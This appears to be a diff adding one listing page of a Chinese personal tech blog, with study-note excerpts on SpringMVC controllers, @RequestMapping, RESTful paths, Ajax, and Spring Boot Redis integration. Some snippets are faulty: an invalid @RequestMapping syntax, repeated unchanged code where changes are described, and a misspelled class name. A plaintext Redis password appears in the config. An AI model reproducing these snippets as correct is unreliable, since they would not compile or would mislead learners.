+<li>DispatcherServlet根据视图解析器解析的视图结果，调用具体的视图。</li>
+<li>最终视图呈现给用户。</li>
+</ol>
+<h3 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h3><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20230409154952600.png" alt="image-20230409154952600"></p>
+<ul>
+<li>新建项目，选择webapp模板</li>
+<li>对pom.xml文件进行修改，添加servlet、springmvc的依赖</li>
+<li>添加springmvc.xml文件，指定包扫描，添加视图解析器</li>
+<li>将web.xml文件的初始内容更改为如下所示，并在其中注册springmvc框架</li>
+</ul>
+<pre><code class="xml">&lt;servlet&gt;
+  &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;
+  &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
+  &lt;init-param&gt;
+    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
+    &lt;param-value&gt;classpath:SpringMVC-servlet.xml&lt;/param-value&gt;
+  &lt;/init-param&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+  &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;
+  &lt;url-pattern&gt;/&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+/：处理所有文件，不包含.jsp文件
+/*：处理所有文件，包含.jsp文件
+</code></pre>
+<ul>
+<li><p>在webapp下新建admin目录（这里的目录名要与视图解析器中的相对应），在该目录下创建main.jsp</p>
+</li>
+<li><p>开发控制器（Servlet），他是一个普通的类</p>
+</li>
+<li></li>
+<li><pre><code class="java">@RequestMapping(&quot;/demo&quot;)     
+public String portal()&#123;
+    System.out.println(&quot;服务器访问到了。。。。。。。&quot;);
+    //将逻辑视图返回
+    return &quot;main&quot;;   //返回值是该文件的文件名（main.jsp）
+&#125;
+</code></pre>
+</li>
+<li><p>添加tomcat进行测试</p>
+</li>
+</ul>
+<p><strong>Controller中方法的返回值：</strong></p>
+<ul>
+<li><strong>String</strong>：客户端资源的地址，自动拼接前缀和后缀，还可以屏蔽自动拼接字符串，可以指定返回的路径</li>
+<li><strong>Object</strong>：返回json格式的对象，自动将对象或集合转为json，使用工具jackson工具进行转换，必须要添加jackson依赖，一般用于ajax请求</li>
+<li><strong>void</strong>：无返回值，一般用于ajax请求</li>
+<li><strong>基本数据类型</strong>：用于ajax请求</li>
+<li>ModeAndView：返回数据和视图对象，用的很少</li>
+</ul>
+<p>web请求执行流程：</p>
+<p>main.jsp &lt;—————————–&gt; DispatcherServlet（核心处理器）&lt;—————————–&gt; SpringMVC的处理器是一个普通的方法</p>
+<p>web.xml文件</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+         version=&quot;4.0&quot;&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20230411181535466.png" alt="image-20230411181535466"></p>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/SpringMVC初探/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/RequestMapping注解/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <p><a href="https://github.com/RequestMapping">@RequestMapping</a>注解用于映射url到控制器类或一个特定的处理程序方法。可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。</p>
+<p>在springmvc.xml配置文件中添加视图解析器</p>
+<pre><code class="java">&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
+          &lt;!--配置前缀--&gt;
+          &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/templates/&quot;/&gt;
+          &lt;!-- 配置后缀--&gt;
+          &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;
+&lt;/bean&gt;
+</code></pre>
+<p>此注解可以加在方法上，是为当前方法注册一个可以访问的名称（路径）</p>
+<pre><code class="java">@RequestMapping(&quot;/demo&quot;)
+public String portal()&#123;
+    System.out.println(&quot;服务器访问到了。。。。。。。&quot;);
+    //将逻辑视图返回
+    return &quot;main&quot;;    //可以访问到/templates/main.jsp页面上
+&#125;
+</code></pre>
+<pre><code class="html">&lt;a href=&quot;&lt;%=request.getContextPath()%&gt;/demo&quot;&gt;访问&lt;/a&gt;      前端的超链接的样式
+</code></pre>
+<p>此注解可以加在类上，相当于包名（虚拟路径），用来区分不同类中相同的请求路径</p>
+<p><strong>例如：在上面的类上添加：@RequestMapping(“&#x2F;user”)    相当于访问&#x2F;templates&#x2F;user&#x2F;main.jsp</strong></p>
+<p>此注解可以区分get请求和post请求</p>
+<pre><code class="java">@RequestMapping(&quot;/req&quot;,method=RequestMethod.GET)
+public String portal()&#123;
+    System.out.println(&quot;处理get请求。。。。。。。&quot;);
+    //将逻辑视图返回
+    return &quot;main&quot;;    //可以访问到/templates/req/main.jsp页面上
+&#125;
+</code></pre>
+<pre><code class="java">@RequestMapping(&quot;/req&quot;,method=RequestMethod.POST)
+public String portal()&#123;
+    System.out.println(&quot;处理post请求。。。。。。。&quot;);
+    //将逻辑视图返回
+    return &quot;main&quot;;    //可以访问到/templates/req/main.jsp页面上
+&#125;
+</code></pre>
+<h3 id="RestFul风格"><a href="#RestFul风格" class="headerlink" title="RestFul风格"></a>RestFul风格</h3><p><strong>概念</strong><br>Restful就是一个资源定位及资源操作的风格。不是标准也不是协议，只是一种风格。基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存等机制。</p>
+<p><strong>功能</strong><br>资源：互联网所有的事物都可以被抽象为资源<br>资源操作：使用POST、DELETE、PUT、GET，使用不同方法对资源进行操作。<br>分别对应 添加、 删除、修改、查询。</p>
+<p><strong>传统方式操作资源</strong> ：通过不同的参数来实现不同的效果！方法单一，post 和 get</p>
+<p> <a target="_blank" rel="noopener" href="http://127.0.0.1/item/queryItem.action?id=1">http://127.0.0.1/item/queryItem.action?id=1</a> 查询,GET<br>​ <a target="_blank" rel="noopener" href="http://127.0.0.1/item/saveItem.action">http://127.0.0.1/item/saveItem.action</a> 新增,POST<br>​ <a target="_blank" rel="noopener" href="http://127.0.0.1/item/updateItem.action">http://127.0.0.1/item/updateItem.action</a> 更新,POST<br>​ <a target="_blank" rel="noopener" href="http://127.0.0.1/item/deleteItem.action?id=1">http://127.0.0.1/item/deleteItem.action?id=1</a> 删除,GET或POST</p>
+<p><strong>使用RESTful操作资源</strong> ： 可以通过不同的请求方式来实现不同的效果！如下：请求地址一样，但是功能可以不同！</p>
+<p> <a target="_blank" rel="noopener" href="http://127.0.0.1/item/1">http://127.0.0.1/item/1</a> 查询,GET<br>​ <a target="_blank" rel="noopener" href="http://127.0.0.1/item">http://127.0.0.1/item</a> 新增,POST<br>​ <a target="_blank" rel="noopener" href="http://127.0.0.1/item">http://127.0.0.1/item</a> 更新,PUT<br>​ <a target="_blank" rel="noopener" href="http://127.0.0.1/item/1">http://127.0.0.1/item/1</a> 删除,DELETE</p>
+<p><strong>学习测试</strong></p>
+<ol>
+<li><p>在新建一个类 RestFulController</p>
+<pre><code class="java">@Controllerpublic class RestFulController &#123;&#125;
+</code></pre>
+</li>
+<li><p>在Spring MVC中可以使用 <a href="https://github.com/PathVariable">@PathVariable</a> 注解，让方法参数的值对应绑定到一个URI模板变量上。</p>
+<pre><code class="java">@Controller
+public class RestFulController &#123;
+    //映射访问路径
+    @RequestMapping(&quot;/commit/&#123;p1&#125;/&#123;p2&#125;&quot;)
+    public String index(@PathVariable int p1, @PathVariable int p2, Model model)&#123;
+        int result = p1+p2;
+        //Spring MVC会自动实例化一个Model对象用于向视图中传值
+        model.addAttribute(&quot;msg&quot;, &quot;结果：&quot;+result);
+        //返回视图位置
+        return &quot;test&quot;;
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>我们来测试请求查看下</p>
+</li>
+</ol>
+<p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudyf5b66304-5add-4c41-836d-d0a54aff420a.png" alt="img"></p>
+<p>思考：使用路径变量的好处？</p>
+<ul>
+<li>使路径变得更加简洁；</li>
+<li>获得参数更加方便，框架会自动进行类型转换。</li>
+<li>通过路径变量的类型可以约束访问参数，如果类型不一样，则访问不到对应的请求方法，如这里访问是的路径是&#x2F;commit&#x2F;1&#x2F;a，则路径与方法不匹配，而不会是参数转换失败。</li>
+</ul>
+<p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudy36c6e329-6d53-4b70-9c3f-cc57fab17e36.png" alt="img"></p>
+<ol>
+<li><p>我们来修改下对应的参数类型，再次测试</p>
+<pre><code class="java">@Controller
+public class RestFulController &#123;
+    //映射访问路径
+    @RequestMapping(&quot;/commit/&#123;p1&#125;/&#123;p2&#125;&quot;)
+    public String index(@PathVariable int p1, @PathVariable int p2, Model model)&#123;
+        int result = p1+p2;
+        //Spring MVC会自动实例化一个Model对象用于向视图中传值
+        model.addAttribute(&quot;msg&quot;, &quot;结果：&quot;+result);
+        //返回视图位置
+        return &quot;test&quot;;
+    &#125;
+&#125;
+</code></pre>
+</li>
+</ol>
+<p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudy4acae90c-e840-485c-b9ac-55a4482620ff.png" alt="img"></p>
+<p><strong>使用method属性指定请求类型</strong></p>
+<p> 用于约束请求的类型，可以收窄请求范围。指定请求谓词的类型如GET, POST, HEAD, OPTIONS, PUT, PATCH, DELETE, TRACE等</p>
+<p>我们来测试一下：</p>
+<ul>
+<li><p>增加一个方法</p>
+<pre><code class="java">@Controller
+public class RestFulController &#123;
+    //映射访问路径
+    @RequestMapping(&quot;/commit/&#123;p1&#125;/&#123;p2&#125;&quot;)
+    public String index(@PathVariable int p1, @PathVariable int p2, Model model)&#123;
+        int result = p1+p2;
+        //Spring MVC会自动实例化一个Model对象用于向视图中传值
+        model.addAttribute(&quot;msg&quot;, &quot;结果：&quot;+result);
+        //返回视图位置
+        return &quot;test&quot;;
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>我们使用浏览器地址栏进行访问默认是Get请求，会报错405：</p>
+</li>
+</ul>
+<p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudyafe79416-8b3d-487a-8ea4-3aa339bc01dd.png" alt="img"></p>
+<ul>
+<li><p>如果将POST修改为GET则正常了；</p>
+<pre><code class="java">@Controller
+public class RestFulController &#123;
+    //映射访问路径
+    @RequestMapping(&quot;/commit/&#123;p1&#125;/&#123;p2&#125;&quot;)
+    public String index(@PathVariable int p1, @PathVariable int p2, Model model)&#123;
+        int result = p1+p2;
+        //Spring MVC会自动实例化一个Model对象用于向视图中传值
+        model.addAttribute(&quot;msg&quot;, &quot;结果：&quot;+result);
+        //返回视图位置
+        return &quot;test&quot;;
+    &#125;
+&#125;
+</code></pre>
+</li>
+</ul>
+<p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudy9fba8ea7-f80c-4f1a-926b-c5d99574cce0.png" alt="img"></p>
+<p><strong>小结：</strong></p>
+<p>Spring MVC 的 <a href="https://github.com/RequestMapping">@RequestMapping</a> 注解能够处理 HTTP 请求的方法, 比如 GET, PUT, POST, DELETE 以及 PATCH。</p>
+<p><strong>所有的地址栏请求默认都会是 HTTP GET 类型的。</strong></p>
+<p>方法级别的注解变体有如下几个： 组合注解</p>
+<pre><code class="java">@GetMapping
+@PostMapping
+@PutMapping
+@DeleteMapping
+@PatchMapping
+</code></pre>
+<p><a href="https://github.com/GetMapping">@GetMapping</a> 是一个组合注解</p>
+<p>它所扮演的是 <a href="https://github.com/RequestMapping">@RequestMapping</a>(method &#x3D;RequestMethod.GET) 的一个快捷方式。</p>
+<p>平时使用的会比较多！</p>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/RequestMapping注解/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/Ajax请求/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <ul>
+<li><strong>AJAX &#x3D; Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</strong></li>
+<li>AJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。</li>
+<li><strong>Ajax 不是一种新的编程语言，而是一种用于创建更好更快以及交互性更强的Web应用程序的技术。</strong></li>
+</ul>
+<p>完成ajax请求访问服务器，返回学生集合</p>
+<ul>
+<li>添加jackson依赖</li>
+<li>在webapp目录下新建js目录，添加jQuery函数库</li>
+<li>在index.jsp上导入函数库</li>
+<li>在controller的方法上添加注解@ResponseBody，专门用来处理ajax请求</li>
+<li>在springmvc.xml文件中添加注解驱动<a href="mvc:annotation-driven">mvc:annotation-driven</a>，它用来解析@ResponseBody注解</li>
+</ul>
+<h3 id="mvc-annotation-driven标签的使用"><a href="#mvc-annotation-driven标签的使用" class="headerlink" title="mvc:annotation-driven标签的使用"></a><a href="mvc:annotation-driven">mvc:annotation-driven</a>标签的使用</h3><p>会自动注册两个bean，分别为：</p>
+<ul>
+<li><strong>DedaultAnnotationHandlerMapping</strong></li>
+<li><strong>AnnotationMethodHandlerAdapter</strong></li>
+<li>是springmvc为@controller分发请求所必需的</li>
+</ul>
+<p>除了注册这两个bean，还提供了很多支持</p>
+<ul>
+<li>支持使用ConversionService实例对表单参数进行类型转换</li>
+<li>支持使用@NumberFormat、@DateTimeFormat</li>
+<li>注解完成数据类型的格式化</li>
+<li>支持使用@RequestBody和@ResponseBody注解</li>
+<li>静态资源的分流也使用这个标签</li>
+</ul>
+<h3 id="资源在WEB-INF目录下"><a href="#资源在WEB-INF目录下" class="headerlink" title="资源在WEB-INF目录下"></a>资源在WEB-INF目录下</h3><p>此目录下的动态资源，只能通过请求转发的方式进行访问</p>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/Ajax请求/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringBoot2/集成Redis/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <p>NoSQL（非关系型数据库）在以下几种情况比较适用：</p>
+<ul>
+<li>数据模型比较简单</li>
+<li>需要灵活性更强的IT系统</li>
+<li>对数据库性能要求较高</li>
+<li>不需要高度的数据一致性</li>
+<li>对于给定的key，比较容易映射复杂值的环境</li>
+</ul>
+<p>Redis是一个开源的，<strong>高性能键值对数据库</strong>，也就是一个非关系型数据库，可以用作数据库、缓存和消息中间件</p>
+<p><strong>Redis是一个简单的，高效的，分布式的，基于内存的缓存工具</strong></p>
+<h3 id="Redis特点"><a href="#Redis特点" class="headerlink" title="Redis特点"></a>Redis特点</h3><ul>
+<li><strong>性能极高</strong> <ul>
+<li>由于数据是存储在内存中</li>
+</ul>
+</li>
+<li><strong>丰富的数据类型</strong><ul>
+<li>string，Hash，List，Set，Ordered Set等</li>
+</ul>
+</li>
+<li><strong>原子性</strong><ul>
+<li>要么成功执行，要么失败全不执行。单个操作是原子性的，多个操作也支持事务，通过MULTI和EXEC指令包起来</li>
+</ul>
+</li>
+<li><strong>丰富的特性</strong><ul>
+<li>支持publich &#x2F; subscribe，通知，key过期等特性</li>
+</ul>
+</li>
+<li><strong>高速读写</strong><ul>
+<li>使用自己实现的分离器，代码量很短，没有使用lock(MySQL)，效率很高</li>
+</ul>
+</li>
+</ul>
+<p><strong>windows版本的redis</strong></p>
+<p>redis-server.exe：服务端， 启动后，不要关闭</p>
+<p>redis-cli.exe：客户端， 访问redis中的数据</p>
+<p>RedisTemplate 使用的是 lettuce 客户端库</p>
+<pre><code class="xml">&lt;!--redis起步依赖： 直接在项目中使用RedisTemplate(StringRedisTemplate)--&gt;
+&lt;dependency&gt;
+   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+   &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
+&lt;/dependency&gt;
+data-redis使用的   lettuce 客户端库
+
+在程序中使用RedisTemplate类的方法 操作redis数据， 实际就是调用的lettuce 客户端的中的方法
+</code></pre>
+<p>例如：</p>
+<p>在springboot框架中添加如下依赖：</p>
+<pre><code class="xml"> &lt;!--redis起步依赖：直接在项目中使用RedisTemplate(StringRedisTemplate)--&gt;
+&lt;dependency&gt;
+            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>在application.properties配置文件中进行如下配置：</p>
+<pre><code class="properties">#配置服务器端口和访问应用上下文路径
+server.port=8082
+server.servlet.context-path=/myRedis
+
+#指定redis
+spring.redis.port=6379
+spring.redis.host=localhost
+spring.redis.password=xhn021019
+</code></pre>
+<p>编写一个controller类</p>
+<pre><code class="java">@RestController
+public class RedisController &#123;
+
+    /**
+     * 注入RedisTemplate
+     *
+     * RedisTemplate泛型
+     * RedisTemplate&lt;String,String&gt;
+     * RedisTemplate&lt;Object,Object&gt;
+     * RedisTemplate
+     */
+    @Resource
+    private RedisTemplate redisTemplate;
+
+    //添加数据到redis
+    @PostMapping(&quot;/addstring&quot;)
+    public String addToRedis(String name,String value)&#123;
+
+        //操作Redis中string类型的数据，先获取ValueOperation对象
+        ValueOperations valueOperations=redisTemplate.opsForValue();
+        //添加数据到redis
+        valueOperations.set(&quot;myname&quot;,&quot;张三&quot;);
+
+        return &quot;向redis添加string类型的数据&quot;;
+    &#125;
+
+    //从redis中获取数据
+    @GetMapping(&quot;/getKey&quot;)
+    public String getData(String key)&#123;
+        ValueOperations valueOperations=redisTemplate.opsForValue();
+        Object o = valueOperations.get(key);
+        return &quot;key是：&quot;+key+&quot;，它的值是：&quot;+o;
+    &#125;
+&#125;
+</code></pre>
+<p>在postman中进行测试</p>
+<h3 id="对比-StringRedisTemplate-和-RedisTemplate"><a href="#对比-StringRedisTemplate-和-RedisTemplate" class="headerlink" title="对比 StringRedisTemplate 和 RedisTemplate"></a>对比 StringRedisTemplate 和 RedisTemplate</h3><p>StringRedisTemplate ： 把k，v 都是作为String处理， 使用的是String的序列化 ， 可读性好</p>
+<p>RedisTemplate ： 把k，v 经过了序列化存到redis。 k，v 是序列化的内容， 不能直接识别.</p>
+<ul>
+<li>默认使用的jdk序列化， 可以修改为前提的序列化</li>
+</ul>
+<p>序列化：把对象转化为可传输的字节序列过程称为序列化。</p>
+<p>反序列化：把字节序列还原为对象的过程称为反序列化。</p>
+<h4 id="为什么进行序列化？"><a href="#为什么进行序列化？" class="headerlink" title="为什么进行序列化？"></a>为什么进行序列化？</h4><p>序列化最终的目的是<strong>为了对象可以跨平台存储，和进行网络传输</strong>。</p>
+<p>而我们进行<strong>跨平台存储和网络传输的方式就是IO</strong>，而我们的IO支持的数据格式就是<strong>字节数组</strong>。</p>
+<p>我们必须在把对象转成字节数组的时候就制定一种规则（序列化）</p>
+<p>那么我们从IO流里面读出数据的时候再以这种规则把对象还原回来（反序列化）。</p>
+<h4 id="序列化的方式"><a href="#序列化的方式" class="headerlink" title="序列化的方式"></a>序列化的方式</h4><p>JDK（不支持跨语言）、JSON、XML、Hessian、Kryo（不支持跨语言）、Thrift、Protofbuff</p>
+<p>Student( name&#x3D;zs, age&#x3D;20)  —-  { “name”:”zs”, “age”:20 }</p>
+<p>java的序列化： 把java对象<strong>转为byte[ ], 二进制数据</strong></p>
+<p>json序列化：json序列化功能将对象<strong>转换为 JSON 格式</strong>或从 JSON 格式转换对象。</p>
+<p>例如：把一个Student对象转换为JSON字符串 {“name”:”李四”, “age”:29} ，反序列化(将JSON字符串 {“name”:”李四”, “age”:29} 转换为Student对象</p>
+<p>设置key或value的序列化方式</p>
+<pre><code class="java">// 使用RedisTemplate ，在存取值之前，设置序列化
+// 设置 key 使用String的序列化
+redisTemplate.setKeySerializer( new StringRedisSerializer());
+
+// 设置 value 的序列化
+redisTemplate.setValueSerializer( new StringRedisSerializer());
+
+redisTemplate.opsForValue().set(k,v);
+</code></pre>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringBoot2/集成Redis/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringBoot2/集成Dubbo/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringBoot2/集成Dubbo/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+
+             
+<div class="page-current">
+
+    <div class="prev">
+        
+        <a href="/page/4/">
+            <span class="page-num">
+                <a-icon type="caret-left" theme="filled" />
+            </span>
+        </a>
+        
+    </div>
+
+    <div class="page-index">
+
+        
+        <span>
+
+            
+            <a href="/"><span class="page-num">1</span></a>
+            <span class="page-omit">...</span>
+            
+
+            
+
+            
+
+            
+            <a href="/page/3">
+                <span class="page-num">
+                    3
+                </span>
+            </a>
+            
+
+            
+            <a href="/page/4/">
+                <span class="page-num">
+                    4
+                </span>
+            </a>
+        </span>
+        
+
+        <span class="current">
+            5
+        </span>
+
+        
+        <span>
+            <a href="/page/6/">
+                <span class="page-num">
+                    6
+                </span>
+            </a>
+            
+            <a href="/page/7">
+                <span class="page-num">
+                    7
+                </span>
+            </a>
+            
+
+            
+            <span class="page-omit">...</span>
+            <a href="/page/12">
+                <span class="page-num">
+                    12
+                </span>
+            </a>
+            
+
+        </span>
+        
+
+    </div>
+
+    <div class="next">
+        
+        <a href="/page/6/ ">
+            <span class="page-num">
+                <a-icon type="caret-right" theme="filled" />
+            </span>
+        </a>
+        
+    </div>
+
+</div>
+
+        </div>
+    </div>
+    
+    <div id="home-card">
+        <a-affix :offset-top="card_top">
+    <a-card class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src="/img/16584.png " alt="头像">
+        </div>
+        <div class="name">
+            kevin7gif
+        </div>
+        <div class="descriptions">
+            
+            <div class="description">
+                弱小和无知不是生存的障碍，傲慢才是
+            </div>
+            
+        </div>
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a href="https://github.com/kevin7gif">
+
+                    
+                    <a-icon type="github"
+                        theme="filled" />
+                    
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://twitter.com/korilin_dev">
+
+                    
+                    <a-icon type="twitter"
+                        theme="" />
+                    
+                </a>
+            </span>
+            
+        </div>
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a href="/img/20230516204349.jpg">
+                    微信联系我
+                </a>
+            </div>
+            
+        </div>
+    </a-card>
+</a-affix>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 菜菜
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @kevin7gif
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+        <div>
+            备案号：<a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">
+                粤ICP备xxxxxx号
+            </a>
+        </div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
